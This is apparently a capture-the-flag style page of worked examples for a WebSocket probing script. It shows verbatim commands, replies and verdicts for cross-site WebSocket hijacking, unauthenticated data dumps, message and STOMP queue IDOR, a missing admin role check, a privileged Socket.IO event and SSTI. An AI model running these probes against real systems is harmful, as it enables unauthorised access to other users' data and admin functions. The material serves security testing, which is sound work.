# Worked examples — each probe end-to-end, verbatim

## Example 1: the Origin check

```bash
$ python3 tools/web/ws_probe.py "wss://x/ws" --origin 'https://evil.example' --message '{}'
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: <hash>
<- the socket opened under a foreign Origin
verdict: CSWSH-candidate — the Origin check is absent
```

## Example 2: the cookie-binding

```bash
$ python3 tools/web/ws_probe.py "wss://x/ws" --headers 'Cookie: session=victim-sess' --message '{"action":"me"}'
<- {"user":"victim","role":"user","id":42}
verdict: the cookie bound the socket -> the victim's identity
```

## Example 3: the unauth data channel

```bash
$ python3 tools/web/ws_probe.py "wss://x/ws" --message '{"action":"dump"}'
<- {"users":[{"id":1,"name":"admin","flag":"flag{...}"}]}
verdict: unauth channel — no credentials, the data flows
```

## Example 4: the message-IDOR

```bash
$ python3 tools/web/ws_probe.py "wss://x/ws" --headers 'Cookie: session=me' \
    --message '{"action":"read","id":"me"}'
<- {"id":"me","data":"my-data"}                        <- the control
$ python3 tools/web/ws_probe.py "wss://x/ws" --headers 'Cookie: session=me' \
    --message '{"action":"read","id":"admin"}'
<- {"id":"admin","data":"admin-data","flag":"..."}      <- the gap
verdict: message-IDOR — the object-scope check is absent
```

## Example 5: the action-dispatch

```bash
$ python3 tools/web/ws_probe.py "wss://x/ws" --headers 'Cookie: session=me' \
    --message '{"action":"admin"}'
<- {"admin":true,"flag":"...","users":[...]}
verdict: action-dispatch gap — no role check on 'admin'
```

## Example 6: the Socket.IO event

```bash
$ python3 tools/web/ws_probe.py "wss://x/socket.io/?EIO=4&transport=websocket" \
    --headers 'Cookie: session=me' --message '42["admin",{}]'
<- 42["admin_result",{"flag":"..."}]
verdict: a privileged event — the Socket.IO dispatch gap
```

## Example 7: the injection

```bash
$ python3 tools/web/ws_probe.py "wss://x/ws" --headers 'Cookie: session=me' \
    --message '{"action":"search","q":"{{7*7}}"}'
<- {"results":["49"]}                                  <- the eval
verdict: SSTI — the field reaches the template engine (web-ssti)
```

## Example 8: the token-in-URL

```bash
$ grep -riE 'wss?://' /tmp/bundle
wss://x/ws?token=eyJhbGc...
verdict: credential-in-URL — the token logs to history/server-logs
```

## Example 9: the STOMP destination

```bash
$ python3 tools/web/ws_probe.py "wss://x/stomp" --headers \
    'Sec-WebSocket-Protocol: v12.stomp' --message 'SUBSCRIBE
id:sub-0
destination:/user/admin/queue'
<- MESSAGE
   destination:/user/admin/queue
   {"flag":"..."}
verdict: a queue-IDOR — SUBSCRIBE to another's queue
```

## Example 10: the uniform rejection

```bash
$ python3 tools/web/ws_probe.py "wss://x/ws" --headers 'Cookie: session=me' \
    --message '{"action":"read","id":"admin"}'
<- {"error":"forbidden"}
$ python3 tools/web/ws_probe.py "wss://x/ws" --headers 'Cookie: session=me' \
    --message '{"action":"read","id":"victim2"}'
<- {"error":"forbidden"}
verdict: uniform — the object-scope check is enforced; the idor cell is
         closed
```

## The example-record

Each example is the verbatim probe + the verbatim reply + the verdict —
the shape `post-probe` takes.
